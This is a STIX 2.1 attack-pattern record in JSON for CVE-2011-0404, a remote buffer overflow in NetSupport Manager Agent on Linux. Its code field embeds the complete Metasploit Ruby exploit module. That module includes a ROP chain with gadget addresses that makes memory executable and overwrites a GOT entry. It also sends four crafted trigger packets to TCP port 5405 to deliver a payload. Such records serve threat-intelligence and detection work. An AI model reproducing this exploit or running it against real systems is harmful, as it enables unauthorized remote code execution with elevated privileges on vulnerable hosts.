{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1dcc5b3d-d2f9-44b3-ab6d-0cd1a23f0a3a",
    "created": "2024-08-14T16:57:27.619971Z",
    "modified": "2024-08-14T16:57:27.619975Z",
    "name": "NetSupport Manager Agent Remote Buffer Overflow",
    "description": " This module exploits a buffer overflow in NetSupport Manager Agent. It uses a similar ROP to the proftpd_iac exploit in order to avoid non executable stack. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/netsupport_manager_agent.rb",
            "external_id": "netsupport_manager_agent.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0404"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2011/Jan/90"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NetSupport Manager Agent Remote Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in NetSupport Manager Agent. It\n        uses a similar ROP to the proftpd_iac exploit in order to avoid non executable stack.\n      },\n      'Author'         =>\n        [\n          'Luca Carettoni (@_ikki)',  # original discovery / exploit\n          'Evan',  # ported from exploit-db exploit\n          'jduck'  # original proftpd_iac ROP, minor cleanups\n        ],\n      'Arch'           => ARCH_X86,\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2011-0404' ],\n          [ 'OSVDB', '70408' ],\n          [ 'BID', '45728' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2011/Jan/90' ],\n          [ 'EDB', '15937' ]\n        ],\n      'Privileged'     => true,\n      'Platform'       => 'linux',\n      'Payload'        =>\n        {\n          'Space'    => 0x975,\n          'BadChars' => \"\",\n          'DisableNops'  => true,\n        },\n      'Targets'        =>\n        [\n          [ 'linux',\n            {\n              'Ret' => 0x0805e50c, # pop eax ; pop ebx ; pop ebp ;;\n              'Pad' => 975,\n              'RopStack' =>\n                [\n                  ### mmap isn't used in the binary so we need to resolve it in libc\n                  0x00041160, # mmap64 - localtime\n                  0xa9ae0e6c, # 0x8092b30 - 0x5e5b1cc4, localtime will become mprotect\n                  0xcccccccc,\n                  0x08084662, # add    DWORD PTR [ebx+0x5e5b1cc4],eax; pop edi; pop ebp ;;\n                  0xcccccccc,\n                  0xcccccccc,\n                  0x080541e4, # localtime@plt (now mmap64)\n                  0x080617e3, # add esp 0x10 ; pop ebx ; pop esi ; pop ebp ;;\n                  0, 0x20000, 0x7, 0x22, 0xffffffff, 0, # mmap64 arguments\n                  0x0, # unused\n                  0x08066332, # pop edx; pop ebx; pop ebp ;;\n                  \"\\x89\\x1c\\xa8\\xc3\".unpack('V').first, # mov [eax+ebp*4], ebx\n                  0xcccccccc,\n                  0xcccccccc,\n                  0x080555c4, # mov [eax] edx ; pop ebp ;;\n                  0xcccccccc,\n                  #0x0807385a, # push eax ; adc al 0x5d ;;\n\n                  ### this is  the stub used to copy shellcode from the stack to\n                  ### the newly mapped executable region\n                  #\\x8D\\xB4\\x24\\x7D\\xFB\\xFF      # lea esi,[dword esp-0x483]\n                  #\\x8D\\x78\\x12                  # lea edi,[eax+0x12]\n                  #\\x6A\\x7F                      # push byte +0x7f\n                  #\\x59                          # pop ecx\n                  #\\xF3\\xA5                      # rep movsd\n\n                  ### there are no good jmp eax so  overwrite getrlimits GOT entry\n                  0x0805591b, # pop ebx; pop ebp ;;\n                  0x08092d68 - 0x4, # 08092d68  0002f007 R_386_JUMP_SLOT   00000000   getrlimit\n                  0x1,        # becomes ebp\n                  0x08084f38, # mov [ebx+0x4] eax ; pop ebx ; pop ebp ;;\n                  0xfb7c24b4, # become eb\n                  0x01,\n                  0x08054ac4, # <getrlimit@plt>\n                  0x0805591b, # pop ebx; pop ebp ;;\n                  #0xffff8d78, # become ebx\n                  0x788dffff,\n                  0x2,\n                  0x08054ac4, # <getrlimit@plt>\n                  0x0805591b, # pop ebx; pop ebp ;;\n                  0x597f6a12,\n                  0x3,\n                  0x08054ac4, # <getrlimit@plt>\n                  0x0805591b, # pop ebx; pop ebp ;;\n                  0x9090a5f2,\n                  0x4,\n                  0x08054ac4, # <getrlimit@plt>\n                  0x0805591b, # pop ebx; pop ebp ;;\n                  0x8d909090,\n                  0x0,\n                  0x08054ac4, # <getrlimit@plt>\n                  0xcccccccc,\n                  0x01010101,\n                ]\n            }\n          ]\n        ],\n      'DisclosureDate' => '2011-01-08',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(5405),\n      ])\n  end\n\n  def exploit\n    connect\n\n    #pop_eax_ebx ;\n    #0x8084662 # add    DWORD PTR [ebx+0x5e5b1cc4],eax ;;\n    triggerA = \"\\x15\\x00\\x5a\\x00\" + \"\\x41\" * 1024 + \"\\x00\\x00\\x00\" +\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n    triggerB = \"\\x25\\x00\\x51\\x00\\x81\\x41\\x41\\x41\\x41\\x41\\x41\\x00\" +\n      \"\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n      \"\\x00\\x00\\x00\"\n\n    triggerC = \"\\x37\\x00\\x03\\x00\\x0a\\x00\\x00\\x00\\x00\\x00\\x58\\xb4\" +\n      \"\\x92\\xff\\x00\\x00\\x69\\x6b\\x6b\\x69\\x00\\x57\\x4f\\x52\" +\n      \"\\x4b\\x47\\x52\\x4f\\x55\\x50\\x00\\x3c\\x3e\" + #pleasure trail\n      #\"\\xcc\" +\n      \"\\x90\" +\n      payload.encoded +\n      \"\\xcc\" * (target['Pad'] - payload.encoded.length) +\n      [target.ret].pack('V')\n\n    new = ''\n    if target['RopStack']\n      new << target['RopStack'].map { |e|\n        if e == 0xcccccccc\n          rand_text(4).unpack('V').first\n        else\n          e\n        end\n      }.pack('V*')\n    end\n\n    triggerC << new\n    triggerC << \"\\x00\" * 4\n    triggerC << \"\\x00\\x00\\x31\\x32\\x2e\\x36\\x32\\x2e\\x31\\x2e\\x34\\x32\"\n    triggerC << \"\\x30\\x00\\x31\\x30\\x00\\x00\"\n\n    triggerD = \"\\x06\\x00\\x07\\x00\\x20\\x00\\x00\\x00\\x0e\\x00\\x32\\x00\" +\n      \"\\x01\\x10\\x18\\x00\\x00\\x01\\x9f\\x0d\\x00\\x00\\xe0\\x07\" +\n      \"\\x06\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x4e\\x00\" +\n      \"\\x02\\x00\\xac\\x00\\x04\\x00\\x7f\\x00\\x00\\x00\"\n\n    print_status(\"Sending A\")\n    sock.put(triggerA)\n    select(nil, nil, nil, 1)\n\n    print_status(\"Sending B\")\n    sock.put(triggerB)\n    select(nil, nil, nil, 1)\n\n    print_status(\"Sending C\")\n    sock.put(triggerC)\n    select(nil, nil, nil, 1)\n\n    print_status(\"Sending D\")\n    sock.put(triggerD)\n    select(nil, nil, nil, 1)\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-01-08",
    "x_mitre_platforms": [
        "linux'"
    ]
}